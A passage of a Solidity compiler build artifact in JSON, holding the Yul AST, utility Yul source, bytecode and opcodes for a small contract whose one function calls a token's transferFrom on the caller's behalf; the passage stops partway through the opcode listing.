														}
													]
												},
												"name": "identity",
												"nativeSrc": "1643:60:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "1661:5:2",
														"nodeType": "YulTypedName",
														"src": "1661:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "ret",
														"nativeSrc": "1671:3:2",
														"nodeType": "YulTypedName",
														"src": "1671:3:2",
														"type": ""
													}
												],
												"src": "1643:60:2"
											},
											{
												"body": {
													"nativeSrc": "1801:114:2",
													"nodeType": "YulBlock",
													"src": "1801:114:2",
													"statements": [
														{
															"nativeSrc": "1811:98:2",
															"nodeType": "YulAssignment",
															"src": "1811:98:2",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nativeSrc": "1901:5:2",
																						"nodeType": "YulIdentifier",
																						"src": "1901:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_rational_1000000000000000000000000_by_1",
																					"nativeSrc": "1851:49:2",
																					"nodeType": "YulIdentifier",
																					"src": "1851:49:2"
																				},
																				"nativeSrc": "1851:56:2",
																				"nodeType": "YulFunctionCall",
																				"src": "1851:56:2"
																			}
																		],
																		"functionName": {
																			"name": "identity",
																			"nativeSrc": "1842:8:2",
																			"nodeType": "YulIdentifier",
																			"src": "1842:8:2"
																		},
																		"nativeSrc": "1842:66:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1842:66:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nativeSrc": "1824:17:2",
																	"nodeType": "YulIdentifier",
																	"src": "1824:17:2"
																},
																"nativeSrc": "1824:85:2",
																"nodeType": "YulFunctionCall",
																"src": "1824:85:2"
															},
															"variableNames": [
																{
																	"name": "converted",
																	"nativeSrc": "1811:9:2",
																	"nodeType": "YulIdentifier",
																	"src": "1811:9:2"
																}
															]
														}
													]
												},
												"name": "convert_t_rational_1000000000000000000000000_by_1_to_t_uint256",
												"nativeSrc": "1709:206:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "1781:5:2",
														"nodeType": "YulTypedName",
														"src": "1781:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "converted",
														"nativeSrc": "1791:9:2",
														"nodeType": "YulTypedName",
														"src": "1791:9:2",
														"type": ""
													}
												],
												"src": "1709:206:2"
											},
											{
												"body": {
													"nativeSrc": "2018:98:2",
													"nodeType": "YulBlock",
													"src": "2018:98:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "2035:3:2",
																		"nodeType": "YulIdentifier",
																		"src": "2035:3:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "2103:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "2103:5:2"
																			}
																		],
																		"functionName": {
																			"name": "convert_t_rational_1000000000000000000000000_by_1_to_t_uint256",
																			"nativeSrc": "2040:62:2",
																			"nodeType": "YulIdentifier",
																			"src": "2040:62:2"
																		},
																		"nativeSrc": "2040:69:2",
																		"nodeType": "YulFunctionCall",
																		"src": "2040:69:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "2028:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "2028:6:2"
																},
																"nativeSrc": "2028:82:2",
																"nodeType": "YulFunctionCall",
																"src": "2028:82:2"
															},
															"nativeSrc": "2028:82:2",
															"nodeType": "YulExpressionStatement",
															"src": "2028:82:2"
														}
													]
												},
												"name": "abi_encode_t_rational_1000000000000000000000000_by_1_to_t_uint256_fromStack",
												"nativeSrc": "1921:195:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "2006:5:2",
														"nodeType": "YulTypedName",
														"src": "2006:5:2",
														"type": ""
													},
													{
														"name": "pos",
														"nativeSrc": "2013:3:2",
														"nodeType": "YulTypedName",
														"src": "2013:3:2",
														"type": ""
													}
												],
												"src": "1921:195:2"
											},
											{
												"body": {
													"nativeSrc": "2308:320:2",
													"nodeType": "YulBlock",
													"src": "2308:320:2",
													"statements": [
														{
															"nativeSrc": "2318:26:2",
															"nodeType": "YulAssignment",
															"src": "2318:26:2",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nativeSrc": "2330:9:2",
																		"nodeType": "YulIdentifier",
																		"src": "2330:9:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "2341:2:2",
																		"nodeType": "YulLiteral",
																		"src": "2341:2:2",
																		"type": "",
																		"value": "96"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nativeSrc": "2326:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "2326:3:2"
																},
																"nativeSrc": "2326:18:2",
																"nodeType": "YulFunctionCall",
																"src": "2326:18:2"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nativeSrc": "2318:4:2",
																	"nodeType": "YulIdentifier",
																	"src": "2318:4:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nativeSrc": "2398:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "2398:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nativeSrc": "2411:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "2411:9:2"
																			},
																			{
																				"kind": "number",
																				"nativeSrc": "2422:1:2",
																				"nodeType": "YulLiteral",
																				"src": "2422:1:2",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nativeSrc": "2407:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "2407:3:2"
																		},
																		"nativeSrc": "2407:17:2",
																		"nodeType": "YulFunctionCall",
																		"src": "2407:17:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_address_to_t_address_fromStack",
																	"nativeSrc": "2354:43:2",
																	"nodeType": "YulIdentifier",
																	"src": "2354:43:2"
																},
																"nativeSrc": "2354:71:2",
																"nodeType": "YulFunctionCall",
																"src": "2354:71:2"
															},
															"nativeSrc": "2354:71:2",
															"nodeType": "YulExpressionStatement",
															"src": "2354:71:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value1",
																		"nativeSrc": "2479:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "2479:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nativeSrc": "2492:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "2492:9:2"
																			},
																			{
																				"kind": "number",
																				"nativeSrc": "2503:2:2",
																				"nodeType": "YulLiteral",
																				"src": "2503:2:2",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nativeSrc": "2488:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "2488:3:2"
																		},
																		"nativeSrc": "2488:18:2",
																		"nodeType": "YulFunctionCall",
																		"src": "2488:18:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_address_to_t_address_fromStack",
																	"nativeSrc": "2435:43:2",
																	"nodeType": "YulIdentifier",
																	"src": "2435:43:2"
																},
																"nativeSrc": "2435:72:2",
																"nodeType": "YulFunctionCall",
																"src": "2435:72:2"
															},
															"nativeSrc": "2435:72:2",
															"nodeType": "YulExpressionStatement",
															"src": "2435:72:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value2",
																		"nativeSrc": "2593:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "2593:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nativeSrc": "2606:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "2606:9:2"
																			},
																			{
																				"kind": "number",
																				"nativeSrc": "2617:2:2",
																				"nodeType": "YulLiteral",
																				"src": "2617:2:2",
																				"type": "",
																				"value": "64"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nativeSrc": "2602:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "2602:3:2"
																		},
																		"nativeSrc": "2602:18:2",
																		"nodeType": "YulFunctionCall",
																		"src": "2602:18:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_rational_1000000000000000000000000_by_1_to_t_uint256_fromStack",
																	"nativeSrc": "2517:75:2",
																	"nodeType": "YulIdentifier",
																	"src": "2517:75:2"
																},
																"nativeSrc": "2517:104:2",
																"nodeType": "YulFunctionCall",
																"src": "2517:104:2"
															},
															"nativeSrc": "2517:104:2",
															"nodeType": "YulExpressionStatement",
															"src": "2517:104:2"
														}
													]
												},
												"name": "abi_encode_tuple_t_address_t_address_t_rational_1000000000000000000000000_by_1__to_t_address_t_address_t_uint256__fromStack_reversed",
												"nativeSrc": "2122:506:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "2264:9:2",
														"nodeType": "YulTypedName",
														"src": "2264:9:2",
														"type": ""
													},
													{
														"name": "value2",
														"nativeSrc": "2276:6:2",
														"nodeType": "YulTypedName",
														"src": "2276:6:2",
														"type": ""
													},
													{
														"name": "value1",
														"nativeSrc": "2284:6:2",
														"nodeType": "YulTypedName",
														"src": "2284:6:2",
														"type": ""
													},
													{
														"name": "value0",
														"nativeSrc": "2292:6:2",
														"nodeType": "YulTypedName",
														"src": "2292:6:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nativeSrc": "2303:4:2",
														"nodeType": "YulTypedName",
														"src": "2303:4:2",
														"type": ""
													}
												],
												"src": "2122:506:2"
											},
											{
												"body": {
													"nativeSrc": "2676:48:2",
													"nodeType": "YulBlock",
													"src": "2676:48:2",
													"statements": [
														{
															"nativeSrc": "2686:32:2",
															"nodeType": "YulAssignment",
															"src": "2686:32:2",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "2711:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "2711:5:2"
																			}
																		],
																		"functionName": {
																			"name": "iszero",
																			"nativeSrc": "2704:6:2",
																			"nodeType": "YulIdentifier",
																			"src": "2704:6:2"
																		},
																		"nativeSrc": "2704:13:2",
																		"nodeType": "YulFunctionCall",
																		"src": "2704:13:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "2697:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "2697:6:2"
																},
																"nativeSrc": "2697:21:2",
																"nodeType": "YulFunctionCall",
																"src": "2697:21:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "2686:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "2686:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bool",
												"nativeSrc": "2634:90:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "2658:5:2",
														"nodeType": "YulTypedName",
														"src": "2658:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "2668:7:2",
														"nodeType": "YulTypedName",
														"src": "2668:7:2",
														"type": ""
													}
												],
												"src": "2634:90:2"
											},
											{
												"body": {
													"nativeSrc": "2770:76:2",
													"nodeType": "YulBlock",
													"src": "2770:76:2",
													"statements": [
														{
															"body": {
																"nativeSrc": "2824:16:2",
																"nodeType": "YulBlock",
																"src": "2824:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nativeSrc": "2833:1:2",
																					"nodeType": "YulLiteral",
																					"src": "2833:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nativeSrc": "2836:1:2",
																					"nodeType": "YulLiteral",
																					"src": "2836:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nativeSrc": "2826:6:2",
																				"nodeType": "YulIdentifier",
																				"src": "2826:6:2"
																			},
																			"nativeSrc": "2826:12:2",
																			"nodeType": "YulFunctionCall",
																			"src": "2826:12:2"
																		},
																		"nativeSrc": "2826:12:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "2826:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "2793:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "2793:5:2"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nativeSrc": "2815:5:2",
																						"nodeType": "YulIdentifier",
																						"src": "2815:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_bool",
																					"nativeSrc": "2800:14:2",
																					"nodeType": "YulIdentifier",
																					"src": "2800:14:2"
																				},
																				"nativeSrc": "2800:21:2",
																				"nodeType": "YulFunctionCall",
																				"src": "2800:21:2"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nativeSrc": "2790:2:2",
																			"nodeType": "YulIdentifier",
																			"src": "2790:2:2"
																		},
																		"nativeSrc": "2790:32:2",
																		"nodeType": "YulFunctionCall",
																		"src": "2790:32:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "2783:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "2783:6:2"
																},
																"nativeSrc": "2783:40:2",
																"nodeType": "YulFunctionCall",
																"src": "2783:40:2"
															},
															"nativeSrc": "2780:60:2",
															"nodeType": "YulIf",
															"src": "2780:60:2"
														}
													]
												},
												"name": "validator_revert_t_bool",
												"nativeSrc": "2730:116:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "2763:5:2",
														"nodeType": "YulTypedName",
														"src": "2763:5:2",
														"type": ""
													}
												],
												"src": "2730:116:2"
											},
											{
												"body": {
													"nativeSrc": "2912:77:2",
													"nodeType": "YulBlock",
													"src": "2912:77:2",
													"statements": [
														{
															"nativeSrc": "2922:22:2",
															"nodeType": "YulAssignment",
															"src": "2922:22:2",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nativeSrc": "2937:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "2937:6:2"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nativeSrc": "2931:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "2931:5:2"
																},
																"nativeSrc": "2931:13:2",
																"nodeType": "YulFunctionCall",
																"src": "2931:13:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nativeSrc": "2922:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "2922:5:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "2977:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "2977:5:2"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_bool",
																	"nativeSrc": "2953:23:2",
																	"nodeType": "YulIdentifier",
																	"src": "2953:23:2"
																},
																"nativeSrc": "2953:30:2",
																"nodeType": "YulFunctionCall",
																"src": "2953:30:2"
															},
															"nativeSrc": "2953:30:2",
															"nodeType": "YulExpressionStatement",
															"src": "2953:30:2"
														}
													]
												},
												"name": "abi_decode_t_bool_fromMemory",
												"nativeSrc": "2852:137:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nativeSrc": "2890:6:2",
														"nodeType": "YulTypedName",
														"src": "2890:6:2",
														"type": ""
													},
													{
														"name": "end",
														"nativeSrc": "2898:3:2",
														"nodeType": "YulTypedName",
														"src": "2898:3:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nativeSrc": "2906:5:2",
														"nodeType": "YulTypedName",
														"src": "2906:5:2",
														"type": ""
													}
												],
												"src": "2852:137:2"
											},
											{
												"body": {
													"nativeSrc": "3069:271:2",
													"nodeType": "YulBlock",
													"src": "3069:271:2",
													"statements": [
														{
															"body": {
																"nativeSrc": "3115:83:2",
																"nodeType": "YulBlock",
																"src": "3115:83:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nativeSrc": "3117:77:2",
																				"nodeType": "YulIdentifier",
																				"src": "3117:77:2"
																			},
																			"nativeSrc": "3117:79:2",
																			"nodeType": "YulFunctionCall",
																			"src": "3117:79:2"
																		},
																		"nativeSrc": "3117:79:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "3117:79:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nativeSrc": "3090:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "3090:7:2"
																			},
																			{
																				"name": "headStart",
																				"nativeSrc": "3099:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "3099:9:2"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nativeSrc": "3086:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "3086:3:2"
																		},
																		"nativeSrc": "3086:23:2",
																		"nodeType": "YulFunctionCall",
																		"src": "3086:23:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "3111:2:2",
																		"nodeType": "YulLiteral",
																		"src": "3111:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nativeSrc": "3082:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "3082:3:2"
																},
																"nativeSrc": "3082:32:2",
																"nodeType": "YulFunctionCall",
																"src": "3082:32:2"
															},
															"nativeSrc": "3079:119:2",
															"nodeType": "YulIf",
															"src": "3079:119:2"
														},
														{
															"nativeSrc": "3208:125:2",
															"nodeType": "YulBlock",
															"src": "3208:125:2",
															"statements": [
																{
																	"nativeSrc": "3223:15:2",
																	"nodeType": "YulVariableDeclaration",
																	"src": "3223:15:2",
																	"value": {
																		"kind": "number",
																		"nativeSrc": "3237:1:2",
																		"nodeType": "YulLiteral",
																		"src": "3237:1:2",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nativeSrc": "3227:6:2",
																			"nodeType": "YulTypedName",
																			"src": "3227:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nativeSrc": "3252:71:2",
																	"nodeType": "YulAssignment",
																	"src": "3252:71:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nativeSrc": "3295:9:2",
																						"nodeType": "YulIdentifier",
																						"src": "3295:9:2"
																					},
																					{
																						"name": "offset",
																						"nativeSrc": "3306:6:2",
																						"nodeType": "YulIdentifier",
																						"src": "3306:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nativeSrc": "3291:3:2",
																					"nodeType": "YulIdentifier",
																					"src": "3291:3:2"
																				},
																				"nativeSrc": "3291:22:2",
																				"nodeType": "YulFunctionCall",
																				"src": "3291:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nativeSrc": "3315:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "3315:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_bool_fromMemory",
																			"nativeSrc": "3262:28:2",
																			"nodeType": "YulIdentifier",
																			"src": "3262:28:2"
																		},
																		"nativeSrc": "3262:61:2",
																		"nodeType": "YulFunctionCall",
																		"src": "3262:61:2"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nativeSrc": "3252:6:2",
																			"nodeType": "YulIdentifier",
																			"src": "3252:6:2"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_bool_fromMemory",
												"nativeSrc": "2995:345:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "3039:9:2",
														"nodeType": "YulTypedName",
														"src": "3039:9:2",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nativeSrc": "3050:7:2",
														"nodeType": "YulTypedName",
														"src": "3050:7:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nativeSrc": "3062:6:2",
														"nodeType": "YulTypedName",
														"src": "3062:6:2",
														"type": ""
													}
												],
												"src": "2995:345:2"
											}
										]
									},
									"contents": "{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_addresst_address(headStart, dataEnd) -> value0, value1 {\n        if slt(sub(dataEnd, headStart), 64) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 32\n\n            value1 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function cleanup_t_rational_1000000000000000000000000_by_1(value) -> cleaned {\n        cleaned := value\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function identity(value) -> ret {\n        ret := value\n    }\n\n    function convert_t_rational_1000000000000000000000000_by_1_to_t_uint256(value) -> converted {\n        converted := cleanup_t_uint256(identity(cleanup_t_rational_1000000000000000000000000_by_1(value)))\n    }\n\n    function abi_encode_t_rational_1000000000000000000000000_by_1_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, convert_t_rational_1000000000000000000000000_by_1_to_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_address_t_address_t_rational_1000000000000000000000000_by_1__to_t_address_t_address_t_uint256__fromStack_reversed(headStart , value2, value1, value0) -> tail {\n        tail := add(headStart, 96)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n        abi_encode_t_address_to_t_address_fromStack(value1,  add(headStart, 32))\n\n        abi_encode_t_rational_1000000000000000000000000_by_1_to_t_uint256_fromStack(value2,  add(headStart, 64))\n\n    }\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function validator_revert_t_bool(value) {\n        if iszero(eq(value, cleanup_t_bool(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_bool_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_bool(value)\n    }\n\n    function abi_decode_tuple_t_bool_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_bool_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n}\n",
									"id": 2,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561000f575f5ffd5b5060043610610029575f3560e01c80636b76484e1461002d575b5f5ffd5b61004760048036038101906100429190610133565b610049565b005b8173ffffffffffffffffffffffffffffffffffffffff166323b872dd338369d3c21bcecceda10000006040518463ffffffff1660e01b8152600401610090939291906101cb565b6020604051808303815f875af11580156100ac573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100d09190610235565b505050565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f610102826100d9565b9050919050565b610112816100f8565b811461011c575f5ffd5b50565b5f8135905061012d81610109565b92915050565b5f5f60408385031215610149576101486100d5565b5b5f6101568582860161011f565b92505060206101678582860161011f565b9150509250929050565b61017a816100f8565b82525050565b5f819050919050565b5f819050919050565b5f819050919050565b5f6101b56101b06101ab84610180565b610192565b610189565b9050919050565b6101c58161019b565b82525050565b5f6060820190506101de5f830186610171565b6101eb6020830185610171565b6101f860408301846101bc565b949350505050565b5f8115159050919050565b61021481610200565b811461021e575f5ffd5b50565b5f8151905061022f8161020b565b92915050565b5f6020828403121561024a576102496100d5565b5b5f61025784828501610221565b9150509291505056fea264697066735822122065e36d6835a8cee07f23408d2e31fba2ce6120f655b7322afb7cd02d04e924b564736f6c634300081d0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x29 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6B76484E EQ PUSH2 0x2D JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x47 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x42 SWAP2 SWAP1 PUSH2 0x133 JUMP JUMPDEST PUSH2 0x49 JUMP JUMPDEST STOP JUMPDEST DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x23B872DD CALLER DUP4 PUSH10 0xD3C21BCECCEDA1000000 PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x90 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x1CB JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0xAC JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xD0 SWAP2 SWAP1 PUSH2 0x235 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x102 DUP3 PUSH2 0xD9 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x112 DUP2 PUSH2 0xF8 JUMP JUMPDEST DUP2 EQ PUSH2 0x11C JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x12D DUP2 PUSH2 0x109 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH0 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x149 JUMPI PUSH2 0x148 PUSH2 0xD5 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x156 DUP6 DUP3 DUP7 ADD PUSH2 0x11F JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x167 DUP6 DUP3 DUP7 ADD PUSH2 0x11F JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH2 0x17A DUP2 PUSH2 0xF8 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x1B5 PUSH2 0x1B0 PUSH2 0x1AB DUP5 PUSH2 0x180 JUMP JUMPDEST PUSH2 0x192 JUMP JUMPDEST PUSH2 0x189 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1C5 DUP2 PUSH2 0x19B JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x1DE PUSH0 DUP4 ADD DUP7 PUSH2 0x171 JUMP JUMPDEST PUSH2 0x1EB PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x171 JUMP JUMPDEST PUSH2 0x1F8 PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x1BC JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x214 DUP2 PUSH2 0x200 JUMP JUMPDEST DUP2 EQ PUSH2 0x21E JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x22F DUP2 PUSH2 0x20B JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x24A JUMPI PUSH2 0x249 PUSH2 0xD5 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x257 DUP5 DUP3 DUP6 ADD PUSH2 0x221 JUMP JUMPDEST SWAP2 POP POP 